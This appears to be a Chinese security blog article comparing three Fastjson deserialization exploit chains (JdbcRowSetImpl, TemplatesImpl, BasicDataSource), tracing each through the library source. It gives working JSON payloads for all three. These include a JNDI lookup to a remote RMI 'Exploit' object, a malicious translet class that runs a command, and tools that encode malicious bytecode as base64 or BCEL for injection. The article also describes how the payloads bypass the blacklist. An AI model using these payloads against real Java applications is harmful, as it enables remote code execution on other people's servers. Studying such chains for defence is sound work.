> 原文链接: https://www.anquanke.com//post/id/248892 


# Fastjson三种利用链对比分析


                                阅读量   
                                **20496**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/t0175552f2250560322.jpg)](https://p1.ssl.qhimg.com/t0175552f2250560322.jpg)



Fastjson已被大家分析过很多次，笔者是java小白，尝试跟着大佬的步伐做一些分析。具体的各种小版本绕过可以参考先知这两篇：[Fastjson 1.2.22-1.2.24反序列化漏洞分析](https://xz.aliyun.com/t/9052)和[Fastjson 1.2.25-1.2.47反序列化漏洞分析](https://xz.aliyun.com/t/8979)。关于fastjson反序列化的深入分析参考三梦师傅的文章：[Fastjson反序列化RCE核心-四个关键点分析](https://xz.aliyun.com/t/7107)

本文主要是对三种利用链做分析和对比



## JdbcRowSetImpl

```
String payload = "`{`\n" +
    "    \"a\":`{`\n" +
    "        \"@type\":\"java.lang.Class\",\n" +
    "        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +
    "    `}`,\n" +
    "    \"b\":`{`\n" +
    "        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
    "        \"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\",\n" +
    "        \"autoCommit\":true\n" +
    "    `}`\n" +
    "`}`";
JSON.parse(payload);
```

payload中的a对象用来当作缓存绕过，需要关注的是第二个对象

注意到其中`"autoCommit":true`，反序列化时，会反射设置属性，调用`com.sun.rowset.JdbcRowSetImpl.setAutoCommit()`

```
public void setAutoCommit(boolean var1) throws SQLException `{`
        if (this.conn != null) `{`
            this.conn.setAutoCommit(var1);
        `}` else `{`
            // conn为空才会调用到这里
            this.conn = this.connect();
            this.conn.setAutoCommit(var1);
        `}`
    `}`
```

跟入`com.sun.rowset.JdbcRowSetImpl.connect()`，触发`lookup`，加载远程恶意对象

```
protected Connection connect() throws SQLException `{`
    if (this.conn != null) `{`
        return this.conn;
    `}` else if (this.getDataSourceName() != null) `{`
        try `{`
            // conn为空且dataSourceName不为空才会到这里
            InitialContext var1 = new InitialContext();
            // 成功触发JNDI注入
            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
```

根据lookup到`com.sun.jndi.rmi.registry.RegistryContext.lookup()`

```
public Object lookup(Name var1) throws NamingException `{`
        if (var1.isEmpty()) `{`
            ......
            return this.decodeObject(var2, var1.getPrefix(1));
        `}`
    `}`
```

跟入`decodeObject`方法，看到加载了远程`Reference`绑定的恶意对象

```
Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
return NamingManager.getObjectInstance(var3, var2, this, this.environment);
```

总结：
- 实战可以利用，JDNI注入基于较低版本的JDK，LDAP适用范围更广
- 必须能出网，加载远端的恶意字节码，造成了局限性


## TemplateImpl

```
String payload = "`{`\"a\":`{`\n" +
    "\"@type\":\"java.lang.Class\",\n" +
    "\"val\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"\n" +
    "`}`,\n" +
    "\"b\":`{`\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"," +
    "\"_bytecodes\":[\"!!!Payload!!!\"],\"_name\":\"a.b\",\"_tfactory\":`{``}`,\"_outputProperties\":`{``}``}`";
JSON.parse(payload, Feature.SupportNonPublicField);
```

注意其中的Payload来自于恶意类，该类应该继承自`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`

```
public class TEMPOC extends AbstractTranslet `{`
    public TEMPOC() throws IOException `{`
        Runtime.getRuntime().exec("calc.exe");
    `}`
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) `{`
    `}`
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers) throws TransletException `{`
    `}`
    public static void main(String[] args) throws Exception `{`
        TEMPOC t = new TEMPOC();
    `}`
`}`
```

类似第一条链，使用两个对象绕过，其中的Payload为恶意类的字节码再Base64编码的结果，给出简易的py脚本

```
fin = open(r"PATH-TO-TEMPOC.class", "rb")
byte = fin.read()
fout = base64.b64encode(byte).decode("utf-8")
print(fout)
```

该链需要开启`Feature.SupportNonPublicField`参数再反射设置属性，查看官方说明，如果某属性不存在set方法，但还想设置值时，需要开启该参数，这里的情况正好符合，而实际项目中很少出现这种情况，导致该链较鸡肋，没有实际的意义（其实`TemplateImpl`类中有set方法，比如`setTransletBytecodes`，但是名称和`Bytecodes`不一致）

在`com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseField`设置属性时会有判断

```
final int mask = Feature.SupportNonPublicField.mask;
if (fieldDeserializer == null
    &amp;&amp; (lexer.isEnabled(mask)
        || (this.beanInfo.parserFeatures &amp; mask) != 0)) `{`
    ......
```

反序列化时，fastjson中会把”_”开头的属性替换为空。并在`outputProperties`设置值时调用`getOutputProperties`

```
public synchronized Properties getOutputProperties() `{`
        try `{`
            return newTransformer().getOutputProperties();
        `}`
        catch (TransformerConfigurationException e) `{`
            return null;
        `}`
    `}`
```

调用到`com.sun.org.apache.xalan.internal.xsltc.trax.newTransformer`方法

```
transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory);
```

跟入`getTransletInstance`

```
// name不能为空所以在payload中设置a.b
if (_name == null) return null;
// 关键
if (_class == null) defineTransletClasses();

// The translet needs to keep a reference to all its auxiliary
// class to prevent the GC from collecting them
AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
```

再跟入`defineTransletClasses`，对父类进行了验证，这样解释了为什么Payload恶意类要继承自该类。如果验证没有问题，将在上方的`newInstance`方法中实例化该类，造成RCE

```
private static String ABSTRACT_TRANSLET
        = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";

if (superClass.getName().equals(ABSTRACT_TRANSLET)) `{`
    _transletIndex = i;
`}`
```

为什么`_bytescode`要对字节码进行base64编码？反序列化的过程中会调用很多类，在经过该类`com.alibaba.fastjson.serializer.ObjectArrayCodec.deserialze`的时候，会对字段进行一次base64的解码

```
......        
if (token == JSONToken.LITERAL_STRING || token == JSONToken.HEX) `{`
    byte[] bytes = lexer.bytesValue();
    ......
```

跟入`lexer.bytesValue()`方法，看到`decodeBase64`

```
public byte[] bytesValue() `{`
    ......
    // base64解码
    return IOUtils.decodeBase64(buf, np + 1, sp);
`}`
```

总结：
- TemplatesImpl类是Java反序列化界比较常用的类，更容易理解和上手
- 需要开启`Feature.SupportNonPublicField`，实战中不适用


## BasicDataSource

```
String payload = "`{`\n" +
    "    \"name\":\n" +
    "    `{`\n" +
    "        \"@type\" : \"java.lang.Class\",\n" +
    "        \"val\"   : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"\n" +
    "    `}`,\n" +
    "    \"x\" : `{`\n" +
    "        \"name\": `{`\n" +
    "            \"@type\" : \"java.lang.Class\",\n" +
    "            \"val\"   : \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
    "        `}`,\n" +
    "        \"y\": `{`\n" +
    "            \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
    "            \"c\": `{`\n" +
    "                \"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
    "                \"driverClassLoader\": `{`\n" +
    "                    \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
    "                `}`,\n" +
    "                \"driverClassName\":\"!!!Payload!!!\",\n" +
    "\n" +
    "                     \"$ref\": \"$.x.y.c.connection\"\n" +
    "\n" +
    "            `}`\n" +
    "        `}`\n" +
    "    `}`\n" +
    "`}`";
JSON.parse(payload);
```

这个Payload适用于1.2.37版本，并且需要导入Tomcat相关的包

```
&lt;dependencies&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
        &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
        &lt;version&gt;1.2.37&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
        &lt;artifactId&gt;tomcat-dbcp&lt;/artifactId&gt;
        &lt;version&gt;8.0.36&lt;/version&gt;
    &lt;/dependency&gt;
&lt;/dependencies&gt;
```

生成`driverClassName`的工具如下

```
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.Repository;

public class Test `{`
    public static void main(String[] args) throws Exception `{`
        JavaClass cls = Repository.lookupClass(Exp.class);
        String code = Utility.encode(cls.getBytes(), true);
        code = "$$BCEL$$" + code;
        new ClassLoader().loadClass(code).newInstance();
        System.out.println(code);
    `}`
`}`
```

关于`com.sun.org.apache.bcel.internal.util.ClassLoader`参考[P师傅(phith0n)](https://github.com/phith0n)的《Java安全漫谈》

BCEL的全名是Apache Commons BCEL，Apache Commons项目下的一个子项目，包含在JDK的原生库中。我们可以通过BCEL提供的两个类 Repository 和 Utility 来利用： Repository 用于将一个Java Class先转换成原生字节码，当然这里也可以直接使用javac命令来编译java文件生成字节码； Utility 用于将原生的字节码转换成BCEL格式的字节码。

生成的BCEL格式大概如下：

```
$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$......
```

将这种格式的字符串，作为“字节码”传入`new ClassLoader().loadClass(code).newInstance();`将会被实例化，当我们在Fastjson反序列化中构造出这种链，将会造成反序列化漏洞

回到Payload，开头一部分用于绕Fastjson黑白名单，没有什么特殊的意义，核心部分如下：

```
"x" : `{`
    "name": `{`
        "@type" : "java.lang.Class",
        "val"   : "com.sun.org.apache.bcel.internal.util.ClassLoader"
    `}`,
    "y": `{`
        "@type":"com.alibaba.fastjson.JSONObject",
        "c": `{`
            "@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
            "driverClassLoader": `{`
                "@type" : "com.sun.org.apache.bcel.internal.util.ClassLoader"
            `}`,
            "driverClassName":"!!!Payload!!!",
            "$ref": "$.x.y.c.connection"
        `}`
    `}`
`}`
```

这个版本利用的是`$ref`这个特性：当fastjson版本&gt;=1.2.36时，我们可以使用`$ref`的方式来调用任意的getter，比如这个Payload调用的是`x.y.c.connection`，x是这个大对象，最终调用的是c对象的connection方法，也就是`BasicDataSource.connection`

参考代码`com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze:591`

```
if ("$ref" == key &amp;&amp; context != null) `{`
    // 传入的ref是$.x.y.c.connection，匹配到else
    if ("@".equals(ref)) `{`
        ...
    `}` else if ("..".equals(ref)) `{`
        ...
    `}` else if ("$".equals(ref)) `{`
        ...
    `}` else `{`
        Object refObj = parser.resolveReference(ref);
        if (refObj != null) `{`
            object = refObj;
        `}` else `{`
            // 将$.x.y.c.connection加入到Task
            parser.addResolveTask(new ResolveTask(context, ref));
            parser.resolveStatus = DefaultJSONParser.NeedToResolve;
        `}`
    `}`
`}`
// 处理后设置到context    
parser.setContext(context, object, fieldName);
```

漏洞的触发点在`com.alibaba.fastjson.JSON.parse:154`

```
parser.handleResovleTask(value);
```

跟入`com.alibaba.fastjson.parser.DefaultJSONParser.handleResovleTask:1465`

```
if (ref.startsWith("$")) `{`
    refValue = getObject(ref);
    if (refValue == null) `{`
        try `{`
            // 看到eval感觉有东西
            refValue = JSONPath.eval(value, ref);
        `}` catch (JSONPathException ex) `{`
            // skip
        `}`
    `}`
`}`
```

跟入`JSONPath.eval`，这里的`segement`数组中的是`[x,y,c,connection]`

```
public Object eval(Object rootObject) `{`
    if (rootObject == null) `{`
        return null;
    `}`

    init();

    Object currentObject = rootObject;
    for (int i = 0; i &lt; segments.length; ++i) `{`
        Segement segement = segments[i];
        // 继续跟入
        currentObject = segement.eval(this, rootObject, currentObject);
    `}`
    return currentObject;
`}`
```

到达`com.alibaba.fastjson.JSONPath:1350`

```
public Object eval(JSONPath path, Object rootObject, Object currentObject) `{`
    if (deep) `{`
        List&lt;Object&gt; results = new ArrayList&lt;Object&gt;();
        path.deepScan(currentObject, propertyName, results);
        return results;
    `}` else `{`
        // return path.getPropertyValue(currentObject, propertyName, true);
        return path.getPropertyValue(currentObject, propertyName, propertyNameHash);
    `}`
`}`
```

继续跟入`path.getPropertyValue`

```
protected Object getPropertyValue(Object currentObject, String propertyName, long propertyNameHash) `{`
    if (currentObject == null) `{`
        return null;
    `}`
    if (currentObject instanceof Map) `{`
        Map map = (Map) currentObject;
        Object val = map.get(propertyName);

        if (val == null &amp;&amp; SIZE == propertyNameHash) `{`
            val = map.size();
        `}`

        return val;
    `}`

    final Class&lt;?&gt; currentClass = currentObject.getClass();

    JavaBeanSerializer beanSerializer = getJavaBeanSerializer(currentClass);
    if (beanSerializer != null) `{`
        try `{`
            // 最后一次循环到达这里
            return beanSerializer.getFieldValue(currentObject, propertyName, propertyNameHash, false);
        `}` catch (Exception e) `{`
            throw new JSONPathException("jsonpath error, path " + path + ", segement " + propertyName, e);
        `}`
    `}`
```

跟入`com.alibaba.fastjson.serializer.JavaBeanSerializer:439`

```
public Object getFieldValue(Object object, String key, long keyHash, boolean throwFieldNotFoundException) `{`
    FieldSerializer fieldDeser = getFieldSerializer(keyHash);
    ......
    // 跟入
    return fieldDeser.getPropertyValue(object);
`}`
```

跟入`com.alibaba.fastjson.serializer.FieldSerializer:145`

```
public Object getPropertyValue(Object object) throws InvocationTargetException, IllegalAccessException `{`
    Object propertyValue =  fieldInfo.get(object);
```

到达`com.alibaba.fastjson.util.FieldInfo`，达到最终触发点：`method.invoke`

```
public Object get(Object javaObject) throws IllegalAccessException, InvocationTargetException `{`
    return method != null
            ? method.invoke(javaObject)
            : field.get(javaObject);
`}`
```

看到这里的javaObject正是`BasicDataSouce`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01309b265d8a553a7e.png)

回到`BasicDataSource`本身

```
public Connection getConnection() throws SQLException `{`
    if (Utils.IS_SECURITY_ENABLED) `{`
        // 跟入
        final PrivilegedExceptionAction&lt;Connection&gt; action = new PaGetConnection();
        try `{`
            return AccessController.doPrivileged(action);
        `}` catch (final PrivilegedActionException e) `{`
            final Throwable cause = e.getCause();
            if (cause instanceof SQLException) `{`
                throw (SQLException) cause;
            `}`
            throw new SQLException(e);
        `}`
    `}`
    return createDataSource().getConnection();
`}`
```

```
private class PaGetConnection implements PrivilegedExceptionAction&lt;Connection&gt; `{`

        @Override
        public Connection run() throws SQLException `{`
            // 跟入createDataSource()
            return createDataSource().getConnection();
        `}`
    `}`
```

```
// 继续跟入createConnectionFactory()
final ConnectionFactory driverConnectionFactory = createConnectionFactory();
```

最终触发点，其中`driverClassName`和`driverClassLoader`都是可控的，由用户输入，指定ClassLoader为`com.sun.org.apache.bcel.internal.util.ClassLoader`，设置ClassName为`BCEL...`这种格式后，在`newInstance`方法执行后被实例化。第二个参数`initial`为true时，类加载后将会直接执行`static`{``}``块中的代码。

```
if (driverClassLoader == null) `{`
    driverFromCCL = Class.forName(driverClassName);
`}` else `{`
    driverFromCCL = Class.forName(
        driverClassName, true, driverClassLoader);
`}`
...
driverFromCCL = Thread.currentThread().getContextClassLoader().loadClass(driverClassName);
...
driverToUse = (Driver) driverFromCCL.newInstance();
```

总结：
- 不需要出网，不需要开启特殊的参数，适用范围较广
- 目标需要引入tomcat依赖，虽说比较常见，但也是一种限制